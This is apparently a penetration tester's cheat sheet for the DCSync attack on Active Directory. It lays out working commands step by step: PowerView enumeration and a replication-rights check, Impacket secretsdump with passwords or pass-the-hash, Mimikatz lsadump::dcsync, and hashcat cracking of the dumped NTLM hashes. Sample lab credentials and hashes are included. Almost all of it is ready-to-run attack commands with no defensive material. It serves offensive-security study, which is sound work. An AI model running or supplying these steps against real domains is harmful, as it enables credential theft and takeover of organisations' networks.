# Domain Controller Synchronization (dcsync)
## Overview
**DCSync** is an attack that leverages the Directory Replication Service Remote Protocol (DRSR) to impersonate a Domain Controller (DC) and request replication of password data from Active Directory (AD). By abusing the extended rights (specifically, the _DS-Replication-Get-Changes_ and _DS-Replication-Get-Changes-All_ permissions), an attacker can retrieve password hashes (and sometimes even cleartext passwords) for AD accounts.
### 1. Reconnaissance and User Enumeration

**Goal:** Identify the target user and verify their group memberships.
**Sample Command (using PowerView in PowerShell):**

```powershell
Get-DomainUser -Identity adunn | Select-Object samaccountname, objectsid, memberof, useraccountcontrol | Format-List
```

- **What It Does:** Retrieves details about the user (here, “adunn”), including the SID, group memberships, and account control settings.

---

### 2. Verify Replication Rights
Required privileges to perform replication:
        - **Replicating Directory Changes**
        - **Replicating Directory Changes All**
        - **Replicating Directory Changes in Filtered Set**
    - By default, members of the following groups have these rights:
        - Domain Admins
        - Enterprise Admins
        - Administrators
        
**Goal:** Confirm that the target (or another account you control) has the required replication privileges.

**Sample Command (using PowerView):**

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"  # Replace with the actual SID
Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
    Where-Object { $_.SecurityIdentifier -match $sid } |
    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
    Format-List
```

- **What It Does:** Scans the ACLs on the domain object (e.g., `DC=yourdomain,DC=com`) and filters for ACEs related to replication. Check for entries such as `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` for the target SID.

---

### 3. Executing the DCSync Attack with Impacket’s secretsdump.py

**Goal:** Request replication from the DC and extract sensitive credential data.

**Sample Command (from a Linux or Windows system with Python and Impacket installed):**

```bash
secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
```
##### Using Hash
```shell
secretsdump.py -outputfile domain_hashes -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
```
**Example**
```shell
secretsdump.py -hashes 'aad3b435b51404eeaad3b435b51404ee':'007A95BE1BE6ED38DEB848A388655B05' 'heist.offsec'/'svc_apache$'@<domain-ip>
```
Use 'aad3b435b51404eeaad3b435b51404ee' for the LMHash field
- **Parameters:**
    - `YOURDOMAIN`: Replace with your actual domain name.
    - `targetUser`: The username that has replication privileges.
    - `targetIP`: The IP address of the domain controller.
       
        ```bash
        impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
        ```
        
    - **Example**:
        
        ```bash
        impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
        ```
        
    - **Result (Extract)**:
        
        ```
        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
        dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
        ```
        
- **What It Does:** Initiates a replication request mimicking a DC. It writes out the NTLM hashes, Kerberos keys, and, if applicable, cleartext passwords to files prefixed with `domain_hashes`.

**After Running, List the Files:**

```bash
ls domain_hashes*
```

- **Expected Files:**
    - `domain_hashes.ntds` – Contains NTLM hashes.
    - `domain_hashes.ntds.kerberos` – Contains Kerberos keys.
    - `domain_hashes.ntds.cleartext` – Contains any cleartext credentials (if reversible encryption is enabled).

---

### 4. Executing the DCSync Attack with Mimikatz
**Run Mimikatz**
    
 ```bash
.\mimikatz.exe
```

**Command**: Dump the NTLM hash of a target user:
        
```bash
lsadump::dcsync /user:<domain>\<username>
 ```
        
**Example**:
        
```bash
lsadump::dcsync /user:corp\dave
 ```
        
**Result (Extract)**:
        
```
Credentials:
Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
```
        
3. **Crack the NTLM Hash**
    
    - **Command**:
        
        ```bash
        hashcat -m 1000 <hash_file> <wordlist> -r <rule_file> --force
        ```
        
    - **Example**:
        
        ```bash
        hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
        ```
        
4. **Dump Domain Admin Hashes**
    
    - Dump credentials of the **Administrator** user:
        
        ```bash
        lsadump::dcsync /user:corp\Administrator
        ```
